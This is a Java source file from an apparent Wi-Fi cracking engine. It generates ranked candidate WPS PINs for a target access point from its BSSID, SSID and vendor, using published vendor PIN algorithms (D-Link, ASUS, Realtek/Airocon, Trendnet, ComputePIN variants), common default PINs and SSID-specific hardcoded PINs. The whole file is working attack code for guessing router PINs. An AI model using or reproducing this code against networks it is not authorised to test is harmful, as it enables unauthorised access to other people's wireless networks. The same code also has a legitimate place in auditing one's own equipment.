package com.opx.oss.engine.crack;

import com.opx.oss.engine.dot11.wsc.WscCrypto;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

/**
 * Candidate WPS PINs for one access point: the published vendor algorithms first, then the
 * canonical defaults, then the two broad chipset formulas. Each PIN carries its checksum digit.
 */
public final class WpsPins {

    /** Tried before any sweep: the defaults that hit a surprising number of routers. */
    public static final String[] COMMON = {
            "12345670", "00000000", "12345678", "11111111",
            "20172527", "28296607", "88888888", "10000005"
    };

    private WpsPins() {
    }

    /** Ranked, de-duplicated candidates for a BSSID, its name and a vendor string. */
    public static List<String> forBssid(byte[] bssid, String ssid, String vendor) {
        return forTarget(null, bssid, ssid, vendor, null);
    }

    /**
     * The full ordered candidate list: the shipped database first (model, then OUI PINs, then the
     * OUI's algorithms), then the SSID patterns, then the broad chipset formulas and defaults.
     */
    public static List<String> forTarget(WpsPinDb.Db db, byte[] bssid, String ssid, String vendor,
                                         String model) {
        Set<String> out = new LinkedHashSet<>();
        if (bssid == null || bssid.length < 6) return new ArrayList<>();

        String oui = String.format(Locale.US, "%02X%02X%02X",
                bssid[0] & 0xFF, bssid[1] & 0xFF, bssid[2] & 0xFF);
        if (db != null && !db.isEmpty()) {
            out.addAll(WpsPinDb.model(db, model));
            out.addAll(WpsPinDb.pins(db, oui));
            for (String algo : WpsPinDb.algos(db, oui)) {
                String pin = dispatch(algo, bssid);
                if (pin != null) out.add(pin);
            }
        }

        String vendorName = vendor == null ? "" : vendor.toLowerCase(Locale.US);
        if (vendorName.contains("dlink") || vendorName.contains("d-link")) {
            out.add(dlink(bssid));
            out.add(dlink1(bssid));
        } else if (vendorName.contains("asus")) {
            out.add(asus(bssid));
        }
        if (ssid != null) {
            if (ssid.matches("^WLAN_[0-9A-Fa-f]{4}$")) {
                out.add("11866428");
                out.add("18836486");
                out.add("88478760");
            } else if (ssid.matches("(?i)^Dlink_[0-9A-Fa-f]{4}$")) {
                out.add("21464065");
            }
        }
        for (String pin : COMMON) out.add(pin);

        out.add(pin24(bssid));
        out.add(compute28(bssid));
        out.add(compute32(bssid));
        out.add(airocon(bssid));
        out.add(trendnet(bssid));
        out.add(invNic(bssid));
        return new ArrayList<>(out);
    }

    /** One algorithm by the name the database uses; {@code null} when it is not implemented. */
    public static String dispatch(String algo, byte[] bssid) {
        if (algo == null) return null;
        switch (algo) {
            case "zhao":
                return pin24(bssid);
            case "computepin_28":
                return compute28(bssid);
            case "computepin_32":
                return compute32(bssid);
            case "dlink":
                return dlink(bssid);
            case "dlink1":
                return dlink1(bssid);
            case "asus":
                return asus(bssid);
            case "airocon":
                return airocon(bssid);
            case "trendnet":
                return trendnet(bssid);
            case "invnic":
                return invNic(bssid);
            default:
                return null;
        }
    }

    /** Seven digits plus the spec's checksum digit. */
    public static String finalize(int raw) {
        int seven = Math.abs(raw % 10_000_000);
        return String.format(Locale.US, "%07d", seven) + WscCrypto.pinChecksum(seven);
    }

    /** Broadcom/Atheros/Ralink: the low three bytes of the BSSID. */
    public static String pin24(byte[] bssid) {
        return finalize(((bssid[3] & 0xFF) << 16) | ((bssid[4] & 0xFF) << 8) | (bssid[5] & 0xFF));
    }

    /** ComputePIN over the low 28 bits of the last four bytes. */
    public static String compute28(byte[] bssid) {
        int raw = ((bssid[2] & 0xFF) << 24) | ((bssid[3] & 0xFF) << 16)
                | ((bssid[4] & 0xFF) << 8) | (bssid[5] & 0xFF);
        return finalize(raw & 0x0FFFFFFF);
    }

    /** ComputePIN over the last four bytes. */
    public static String compute32(byte[] bssid) {
        int raw = ((bssid[2] & 0xFF) << 24) | ((bssid[3] & 0xFF) << 16)
                | ((bssid[4] & 0xFF) << 8) | (bssid[5] & 0xFF);
        return finalize(raw);
    }

    /** Airocon/Realtek (RTL8186/8196): sums of neighbouring bytes. */
    public static String airocon(byte[] b) {
        int raw = ((b[0] + b[1]) % 10)
                + ((b[5] + b[0]) % 10) * 10
                + ((b[4] + b[5]) % 10) * 100
                + ((b[3] + b[4]) % 10) * 1000
                + ((b[2] + b[3]) % 10) * 10000
                + ((b[1] + b[2]) % 10) * 100000
                + ((b[0] + b[1]) % 10) * 1000000;
        return finalize(raw);
    }

    /** Trendnet TEW: decimal of the last three bytes. */
    public static String trendnet(byte[] b) {
        return finalize((b[3] & 0xFF) * 10000 + (b[4] & 0xFF) * 100 + (b[5] & 0xFF));
    }

    /** The BSSID's NIC bytes, inverted. */
    public static String invNic(byte[] b) {
        int nic = ((b[3] & 0xFF) << 16) | ((b[4] & 0xFF) << 8) | (b[5] & 0xFF);
        return finalize(nic ^ 0xFFFFFF);
    }

    public static String dlink(byte[] bssid) {
        int nic = ((bssid[3] & 0xFF) << 16) | ((bssid[4] & 0xFF) << 8) | (bssid[5] & 0xFF);
        return finalize(dlinkRaw(nic));
    }

    public static String dlink1(byte[] bssid) {
        int nic = (((bssid[3] & 0xFF) << 16) | ((bssid[4] & 0xFF) << 8) | (bssid[5] & 0xFF) + 1)
                & 0xFFFFFF;
        return finalize(dlinkRaw(nic));
    }

    private static int dlinkRaw(int nic) {
        int pin = nic ^ 0x55AA55;
        pin ^= ((pin & 0x0F) << 4) + ((pin & 0x0F) << 8) + ((pin & 0x0F) << 12)
                + ((pin & 0x0F) << 16) + ((pin & 0x0F) << 20);
        pin %= 10_000_000;
        if (pin < 1_000_000) pin += (pin % 9) * 1_000_000 + 1_000_000;
        return pin;
    }

    /** ASUS RT series: digits from byte sums modulo a moving base. */
    public static String asus(byte[] b) {
        int sum = 0;
        for (int i = 1; i < 6; i++) sum += b[i] & 0xFF;
        StringBuilder digits = new StringBuilder(7);
        for (int i = 0; i < 7; i++) {
            int digit = ((b[i % 6] & 0xFF) + (b[5] & 0xFF)) % (10 - (i + sum) % 7);
            digits.append((char) ('0' + digit));
        }
        return finalize(Integer.parseInt(digits.toString()));
    }
}
